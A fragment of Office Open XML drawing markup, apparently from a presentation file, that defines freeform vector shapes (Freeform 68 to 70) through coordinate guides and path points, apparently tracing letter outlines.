                <a:gd name="T15" fmla="*/ 177 h 212"/>
                <a:gd name="T16" fmla="*/ 158 w 175"/>
                <a:gd name="T17" fmla="*/ 200 h 212"/>
                <a:gd name="T18" fmla="*/ 164 w 175"/>
                <a:gd name="T19" fmla="*/ 204 h 212"/>
                <a:gd name="T20" fmla="*/ 175 w 175"/>
                <a:gd name="T21" fmla="*/ 212 h 212"/>
                <a:gd name="T22" fmla="*/ 99 w 175"/>
                <a:gd name="T23" fmla="*/ 204 h 212"/>
                <a:gd name="T24" fmla="*/ 109 w 175"/>
                <a:gd name="T25" fmla="*/ 204 h 212"/>
                <a:gd name="T26" fmla="*/ 117 w 175"/>
                <a:gd name="T27" fmla="*/ 200 h 212"/>
                <a:gd name="T28" fmla="*/ 119 w 175"/>
                <a:gd name="T29" fmla="*/ 177 h 212"/>
                <a:gd name="T30" fmla="*/ 119 w 175"/>
                <a:gd name="T31" fmla="*/ 117 h 212"/>
                <a:gd name="T32" fmla="*/ 115 w 175"/>
                <a:gd name="T33" fmla="*/ 87 h 212"/>
                <a:gd name="T34" fmla="*/ 113 w 175"/>
                <a:gd name="T35" fmla="*/ 82 h 212"/>
                <a:gd name="T36" fmla="*/ 101 w 175"/>
                <a:gd name="T37" fmla="*/ 76 h 212"/>
                <a:gd name="T38" fmla="*/ 94 w 175"/>
                <a:gd name="T39" fmla="*/ 74 h 212"/>
                <a:gd name="T40" fmla="*/ 76 w 175"/>
                <a:gd name="T41" fmla="*/ 80 h 212"/>
                <a:gd name="T42" fmla="*/ 65 w 175"/>
                <a:gd name="T43" fmla="*/ 93 h 212"/>
                <a:gd name="T44" fmla="*/ 59 w 175"/>
                <a:gd name="T45" fmla="*/ 107 h 212"/>
                <a:gd name="T46" fmla="*/ 57 w 175"/>
                <a:gd name="T47" fmla="*/ 177 h 212"/>
                <a:gd name="T48" fmla="*/ 57 w 175"/>
                <a:gd name="T49" fmla="*/ 192 h 212"/>
                <a:gd name="T50" fmla="*/ 63 w 175"/>
                <a:gd name="T51" fmla="*/ 202 h 212"/>
                <a:gd name="T52" fmla="*/ 78 w 175"/>
                <a:gd name="T53" fmla="*/ 204 h 212"/>
                <a:gd name="T54" fmla="*/ 0 w 175"/>
                <a:gd name="T55" fmla="*/ 212 h 212"/>
                <a:gd name="T56" fmla="*/ 0 w 175"/>
                <a:gd name="T57" fmla="*/ 204 h 212"/>
                <a:gd name="T58" fmla="*/ 16 w 175"/>
                <a:gd name="T59" fmla="*/ 202 h 212"/>
                <a:gd name="T60" fmla="*/ 22 w 175"/>
                <a:gd name="T61" fmla="*/ 192 h 212"/>
                <a:gd name="T62" fmla="*/ 22 w 175"/>
                <a:gd name="T63" fmla="*/ 35 h 212"/>
                <a:gd name="T64" fmla="*/ 22 w 175"/>
                <a:gd name="T65" fmla="*/ 21 h 212"/>
                <a:gd name="T66" fmla="*/ 18 w 175"/>
                <a:gd name="T67" fmla="*/ 14 h 212"/>
                <a:gd name="T68" fmla="*/ 12 w 175"/>
                <a:gd name="T69" fmla="*/ 10 h 212"/>
                <a:gd name="T70" fmla="*/ 0 w 175"/>
                <a:gd name="T71" fmla="*/ 2 h 212"/>
                <a:gd name="T72" fmla="*/ 59 w 175"/>
                <a:gd name="T73" fmla="*/ 0 h 212"/>
                <a:gd name="T74" fmla="*/ 57 w 175"/>
                <a:gd name="T75" fmla="*/ 89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5" h="212">
                  <a:moveTo>
                    <a:pt x="57" y="89"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="57" y="89"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="66" y="76"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="78" y="68"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="92" y="62"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="107" y="62"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="107" y="62"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="121" y="62"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="132" y="66"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="140" y="72"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="148" y="82"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="148" y="82"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="152" y="95"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="154" y="115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4" y="192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="158" y="200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="160" y="202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="164" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="175" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="175" y="212"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="99" y="212"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="99" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="99" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="109" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="113" y="202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="117" y="200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="119" y="192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="119" y="177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="119" y="117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="119" y="117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="119" y="99"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="115" y="87"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="115" y="87"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="113" y="82"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="107" y="78"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="101" y="76"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="94" y="74"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="94" y="74"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="86" y="76"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="76" y="80"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="70" y="85"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="65" y="93"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="65" y="93"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="59" y="107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57" y="122"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57" y="177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57" y="177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57" y="192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="61" y="200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="63" y="202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="66" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="78" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="78" y="212"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="212"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16" y="202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20" y="200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22" y="192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22" y="177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22" y="35"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22" y="35"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22" y="21"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20" y="16"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18" y="14"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12" y="10"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="8"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="2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57" y="56"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57" y="8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7" name="Freeform 68">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{024EAB24-0AC1-4672-8506-9F88FB41FC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4242" y="4750882"/>
              <a:ext cx="41281" cy="90912"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 48 w 89"/>
                <a:gd name="T1" fmla="*/ 148 h 196"/>
                <a:gd name="T2" fmla="*/ 48 w 89"/>
                <a:gd name="T3" fmla="*/ 148 h 196"/>
                <a:gd name="T4" fmla="*/ 50 w 89"/>
                <a:gd name="T5" fmla="*/ 163 h 196"/>
                <a:gd name="T6" fmla="*/ 52 w 89"/>
                <a:gd name="T7" fmla="*/ 173 h 196"/>
                <a:gd name="T8" fmla="*/ 52 w 89"/>
                <a:gd name="T9" fmla="*/ 173 h 196"/>
                <a:gd name="T10" fmla="*/ 54 w 89"/>
                <a:gd name="T11" fmla="*/ 179 h 196"/>
                <a:gd name="T12" fmla="*/ 58 w 89"/>
                <a:gd name="T13" fmla="*/ 181 h 196"/>
                <a:gd name="T14" fmla="*/ 62 w 89"/>
                <a:gd name="T15" fmla="*/ 183 h 196"/>
                <a:gd name="T16" fmla="*/ 66 w 89"/>
                <a:gd name="T17" fmla="*/ 185 h 196"/>
                <a:gd name="T18" fmla="*/ 66 w 89"/>
                <a:gd name="T19" fmla="*/ 185 h 196"/>
                <a:gd name="T20" fmla="*/ 75 w 89"/>
                <a:gd name="T21" fmla="*/ 183 h 196"/>
                <a:gd name="T22" fmla="*/ 85 w 89"/>
                <a:gd name="T23" fmla="*/ 175 h 196"/>
                <a:gd name="T24" fmla="*/ 89 w 89"/>
                <a:gd name="T25" fmla="*/ 183 h 196"/>
                <a:gd name="T26" fmla="*/ 89 w 89"/>
                <a:gd name="T27" fmla="*/ 183 h 196"/>
                <a:gd name="T28" fmla="*/ 81 w 89"/>
                <a:gd name="T29" fmla="*/ 189 h 196"/>
                <a:gd name="T30" fmla="*/ 71 w 89"/>
                <a:gd name="T31" fmla="*/ 193 h 196"/>
                <a:gd name="T32" fmla="*/ 62 w 89"/>
                <a:gd name="T33" fmla="*/ 196 h 196"/>
                <a:gd name="T34" fmla="*/ 50 w 89"/>
                <a:gd name="T35" fmla="*/ 196 h 196"/>
                <a:gd name="T36" fmla="*/ 50 w 89"/>
                <a:gd name="T37" fmla="*/ 196 h 196"/>
                <a:gd name="T38" fmla="*/ 40 w 89"/>
                <a:gd name="T39" fmla="*/ 195 h 196"/>
                <a:gd name="T40" fmla="*/ 31 w 89"/>
                <a:gd name="T41" fmla="*/ 193 h 196"/>
                <a:gd name="T42" fmla="*/ 25 w 89"/>
                <a:gd name="T43" fmla="*/ 187 h 196"/>
                <a:gd name="T44" fmla="*/ 19 w 89"/>
                <a:gd name="T45" fmla="*/ 181 h 196"/>
                <a:gd name="T46" fmla="*/ 19 w 89"/>
                <a:gd name="T47" fmla="*/ 181 h 196"/>
                <a:gd name="T48" fmla="*/ 17 w 89"/>
                <a:gd name="T49" fmla="*/ 175 h 196"/>
                <a:gd name="T50" fmla="*/ 15 w 89"/>
                <a:gd name="T51" fmla="*/ 169 h 196"/>
                <a:gd name="T52" fmla="*/ 15 w 89"/>
                <a:gd name="T53" fmla="*/ 142 h 196"/>
                <a:gd name="T54" fmla="*/ 15 w 89"/>
                <a:gd name="T55" fmla="*/ 55 h 196"/>
                <a:gd name="T56" fmla="*/ 0 w 89"/>
                <a:gd name="T57" fmla="*/ 55 h 196"/>
                <a:gd name="T58" fmla="*/ 0 w 89"/>
                <a:gd name="T59" fmla="*/ 47 h 196"/>
                <a:gd name="T60" fmla="*/ 0 w 89"/>
                <a:gd name="T61" fmla="*/ 47 h 196"/>
                <a:gd name="T62" fmla="*/ 7 w 89"/>
                <a:gd name="T63" fmla="*/ 45 h 196"/>
                <a:gd name="T64" fmla="*/ 15 w 89"/>
                <a:gd name="T65" fmla="*/ 43 h 196"/>
                <a:gd name="T66" fmla="*/ 21 w 89"/>
                <a:gd name="T67" fmla="*/ 39 h 196"/>
                <a:gd name="T68" fmla="*/ 25 w 89"/>
                <a:gd name="T69" fmla="*/ 32 h 196"/>
                <a:gd name="T70" fmla="*/ 25 w 89"/>
                <a:gd name="T71" fmla="*/ 32 h 196"/>
                <a:gd name="T72" fmla="*/ 31 w 89"/>
                <a:gd name="T73" fmla="*/ 20 h 196"/>
                <a:gd name="T74" fmla="*/ 37 w 89"/>
                <a:gd name="T75" fmla="*/ 2 h 196"/>
                <a:gd name="T76" fmla="*/ 50 w 89"/>
                <a:gd name="T77" fmla="*/ 0 h 196"/>
                <a:gd name="T78" fmla="*/ 50 w 89"/>
                <a:gd name="T79" fmla="*/ 0 h 196"/>
                <a:gd name="T80" fmla="*/ 48 w 89"/>
                <a:gd name="T81" fmla="*/ 47 h 196"/>
                <a:gd name="T82" fmla="*/ 83 w 89"/>
                <a:gd name="T83" fmla="*/ 47 h 196"/>
                <a:gd name="T84" fmla="*/ 83 w 89"/>
                <a:gd name="T85" fmla="*/ 55 h 196"/>
                <a:gd name="T86" fmla="*/ 48 w 89"/>
                <a:gd name="T87" fmla="*/ 55 h 196"/>
                <a:gd name="T88" fmla="*/ 48 w 89"/>
                <a:gd name="T89" fmla="*/ 148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9" h="196">
                  <a:moveTo>
                    <a:pt x="48" y="148"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="48" y="148"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50" y="163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="52" y="173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="52" y="173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58" y="181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62" y="183"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="66" y="185"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="66" y="185"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="75" y="183"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="85" y="175"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="89" y="183"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="89" y="183"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="81" y="189"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="71" y="193"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62" y="196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50" y="196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50" y="196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="40" y="195"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="31" y="193"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="187"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19" y="181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19" y="181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17" y="175"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="169"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="55"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="55"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="47"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="47"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7" y="45"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="43"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="39"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="32"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="32"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="31" y="20"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="2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48" y="47"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="83" y="47"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="83" y="55"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="48" y="55"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="48" y="1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8" name="Freeform 69">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D51895A5-C9C1-4D9B-9CE4-AD61BCCD37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2017" y="4750882"/>
              <a:ext cx="41281" cy="90912"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 48 w 89"/>
                <a:gd name="T1" fmla="*/ 148 h 196"/>
                <a:gd name="T2" fmla="*/ 48 w 89"/>
                <a:gd name="T3" fmla="*/ 148 h 196"/>
                <a:gd name="T4" fmla="*/ 50 w 89"/>
                <a:gd name="T5" fmla="*/ 163 h 196"/>
                <a:gd name="T6" fmla="*/ 52 w 89"/>
                <a:gd name="T7" fmla="*/ 173 h 196"/>
                <a:gd name="T8" fmla="*/ 52 w 89"/>
                <a:gd name="T9" fmla="*/ 173 h 196"/>
                <a:gd name="T10" fmla="*/ 54 w 89"/>
                <a:gd name="T11" fmla="*/ 179 h 196"/>
                <a:gd name="T12" fmla="*/ 58 w 89"/>
                <a:gd name="T13" fmla="*/ 181 h 196"/>
                <a:gd name="T14" fmla="*/ 62 w 89"/>
                <a:gd name="T15" fmla="*/ 183 h 196"/>
                <a:gd name="T16" fmla="*/ 65 w 89"/>
                <a:gd name="T17" fmla="*/ 185 h 196"/>
                <a:gd name="T18" fmla="*/ 65 w 89"/>
                <a:gd name="T19" fmla="*/ 185 h 196"/>
                <a:gd name="T20" fmla="*/ 75 w 89"/>
                <a:gd name="T21" fmla="*/ 183 h 196"/>
                <a:gd name="T22" fmla="*/ 85 w 89"/>
                <a:gd name="T23" fmla="*/ 175 h 196"/>
                <a:gd name="T24" fmla="*/ 89 w 89"/>
                <a:gd name="T25" fmla="*/ 183 h 196"/>
                <a:gd name="T26" fmla="*/ 89 w 89"/>
                <a:gd name="T27" fmla="*/ 183 h 196"/>
                <a:gd name="T28" fmla="*/ 79 w 89"/>
                <a:gd name="T29" fmla="*/ 189 h 196"/>
                <a:gd name="T30" fmla="*/ 71 w 89"/>
                <a:gd name="T31" fmla="*/ 193 h 196"/>
                <a:gd name="T32" fmla="*/ 62 w 89"/>
                <a:gd name="T33" fmla="*/ 196 h 196"/>
                <a:gd name="T34" fmla="*/ 50 w 89"/>
                <a:gd name="T35" fmla="*/ 196 h 196"/>
                <a:gd name="T36" fmla="*/ 50 w 89"/>
                <a:gd name="T37" fmla="*/ 196 h 196"/>
                <a:gd name="T38" fmla="*/ 40 w 89"/>
                <a:gd name="T39" fmla="*/ 195 h 196"/>
                <a:gd name="T40" fmla="*/ 31 w 89"/>
                <a:gd name="T41" fmla="*/ 193 h 196"/>
                <a:gd name="T42" fmla="*/ 25 w 89"/>
                <a:gd name="T43" fmla="*/ 187 h 196"/>
                <a:gd name="T44" fmla="*/ 19 w 89"/>
                <a:gd name="T45" fmla="*/ 181 h 196"/>
                <a:gd name="T46" fmla="*/ 19 w 89"/>
                <a:gd name="T47" fmla="*/ 181 h 196"/>
                <a:gd name="T48" fmla="*/ 17 w 89"/>
                <a:gd name="T49" fmla="*/ 175 h 196"/>
                <a:gd name="T50" fmla="*/ 15 w 89"/>
                <a:gd name="T51" fmla="*/ 169 h 196"/>
                <a:gd name="T52" fmla="*/ 15 w 89"/>
                <a:gd name="T53" fmla="*/ 142 h 196"/>
                <a:gd name="T54" fmla="*/ 15 w 89"/>
                <a:gd name="T55" fmla="*/ 55 h 196"/>
                <a:gd name="T56" fmla="*/ 0 w 89"/>
                <a:gd name="T57" fmla="*/ 55 h 196"/>
                <a:gd name="T58" fmla="*/ 0 w 89"/>
                <a:gd name="T59" fmla="*/ 47 h 196"/>
                <a:gd name="T60" fmla="*/ 0 w 89"/>
                <a:gd name="T61" fmla="*/ 47 h 196"/>
                <a:gd name="T62" fmla="*/ 7 w 89"/>
                <a:gd name="T63" fmla="*/ 45 h 196"/>
                <a:gd name="T64" fmla="*/ 15 w 89"/>
                <a:gd name="T65" fmla="*/ 43 h 196"/>
                <a:gd name="T66" fmla="*/ 21 w 89"/>
                <a:gd name="T67" fmla="*/ 39 h 196"/>
                <a:gd name="T68" fmla="*/ 25 w 89"/>
                <a:gd name="T69" fmla="*/ 32 h 196"/>
                <a:gd name="T70" fmla="*/ 25 w 89"/>
                <a:gd name="T71" fmla="*/ 32 h 196"/>
                <a:gd name="T72" fmla="*/ 31 w 89"/>
                <a:gd name="T73" fmla="*/ 20 h 196"/>
                <a:gd name="T74" fmla="*/ 36 w 89"/>
                <a:gd name="T75" fmla="*/ 2 h 196"/>
                <a:gd name="T76" fmla="*/ 50 w 89"/>
                <a:gd name="T77" fmla="*/ 0 h 196"/>
                <a:gd name="T78" fmla="*/ 50 w 89"/>
                <a:gd name="T79" fmla="*/ 0 h 196"/>
                <a:gd name="T80" fmla="*/ 48 w 89"/>
                <a:gd name="T81" fmla="*/ 47 h 196"/>
                <a:gd name="T82" fmla="*/ 83 w 89"/>
                <a:gd name="T83" fmla="*/ 47 h 196"/>
                <a:gd name="T84" fmla="*/ 83 w 89"/>
                <a:gd name="T85" fmla="*/ 55 h 196"/>
                <a:gd name="T86" fmla="*/ 48 w 89"/>
                <a:gd name="T87" fmla="*/ 55 h 196"/>
                <a:gd name="T88" fmla="*/ 48 w 89"/>
                <a:gd name="T89" fmla="*/ 148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9" h="196">
                  <a:moveTo>
                    <a:pt x="48" y="148"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="48" y="148"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50" y="163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="52" y="173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="52" y="173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58" y="181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62" y="183"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="65" y="185"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="65" y="185"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="75" y="183"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="85" y="175"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="89" y="183"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="89" y="183"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="79" y="189"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="71" y="193"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62" y="196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50" y="196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50" y="196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="40" y="195"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="31" y="193"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="187"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19" y="181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19" y="181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17" y="175"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="169"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="55"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="55"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="47"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="47"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7" y="45"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="43"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="39"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="32"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="32"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="31" y="20"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="36" y="2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48" y="47"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="83" y="47"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="83" y="55"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="48" y="55"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="48" y="1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29" name="Freeform 70">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BA1E09B7-EBFA-4D05-ABDC-B0EA426950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66081" y="4770827"/>
              <a:ext cx="73750" cy="98333"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 54 w 159"/>
                <a:gd name="T1" fmla="*/ 22 h 212"/>
                <a:gd name="T2" fmla="*/ 75 w 159"/>
                <a:gd name="T3" fmla="*/ 4 h 212"/>
                <a:gd name="T4" fmla="*/ 99 w 159"/>
                <a:gd name="T5" fmla="*/ 0 h 212"/>
                <a:gd name="T6" fmla="*/ 112 w 159"/>
                <a:gd name="T7" fmla="*/ 0 h 212"/>
                <a:gd name="T8" fmla="*/ 134 w 159"/>
                <a:gd name="T9" fmla="*/ 10 h 212"/>
                <a:gd name="T10" fmla="*/ 149 w 159"/>
                <a:gd name="T11" fmla="*/ 29 h 212"/>
                <a:gd name="T12" fmla="*/ 157 w 159"/>
                <a:gd name="T13" fmla="*/ 56 h 212"/>
                <a:gd name="T14" fmla="*/ 159 w 159"/>
                <a:gd name="T15" fmla="*/ 72 h 212"/>
                <a:gd name="T16" fmla="*/ 153 w 159"/>
                <a:gd name="T17" fmla="*/ 107 h 212"/>
                <a:gd name="T18" fmla="*/ 141 w 159"/>
                <a:gd name="T19" fmla="*/ 132 h 212"/>
                <a:gd name="T20" fmla="*/ 132 w 159"/>
                <a:gd name="T21" fmla="*/ 142 h 212"/>
                <a:gd name="T22" fmla="*/ 108 w 159"/>
                <a:gd name="T23" fmla="*/ 152 h 212"/>
                <a:gd name="T24" fmla="*/ 93 w 159"/>
                <a:gd name="T25" fmla="*/ 153 h 212"/>
                <a:gd name="T26" fmla="*/ 73 w 159"/>
                <a:gd name="T27" fmla="*/ 150 h 212"/>
                <a:gd name="T28" fmla="*/ 54 w 159"/>
                <a:gd name="T29" fmla="*/ 138 h 212"/>
                <a:gd name="T30" fmla="*/ 54 w 159"/>
                <a:gd name="T31" fmla="*/ 177 h 212"/>
                <a:gd name="T32" fmla="*/ 56 w 159"/>
                <a:gd name="T33" fmla="*/ 196 h 212"/>
                <a:gd name="T34" fmla="*/ 62 w 159"/>
                <a:gd name="T35" fmla="*/ 202 h 212"/>
                <a:gd name="T36" fmla="*/ 77 w 159"/>
                <a:gd name="T37" fmla="*/ 204 h 212"/>
                <a:gd name="T38" fmla="*/ 0 w 159"/>
                <a:gd name="T39" fmla="*/ 212 h 212"/>
                <a:gd name="T40" fmla="*/ 0 w 159"/>
                <a:gd name="T41" fmla="*/ 204 h 212"/>
                <a:gd name="T42" fmla="*/ 15 w 159"/>
                <a:gd name="T43" fmla="*/ 202 h 212"/>
                <a:gd name="T44" fmla="*/ 21 w 159"/>
                <a:gd name="T45" fmla="*/ 192 h 212"/>
                <a:gd name="T46" fmla="*/ 21 w 159"/>
                <a:gd name="T47" fmla="*/ 37 h 212"/>
                <a:gd name="T48" fmla="*/ 21 w 159"/>
                <a:gd name="T49" fmla="*/ 23 h 212"/>
                <a:gd name="T50" fmla="*/ 15 w 159"/>
                <a:gd name="T51" fmla="*/ 12 h 212"/>
                <a:gd name="T52" fmla="*/ 0 w 159"/>
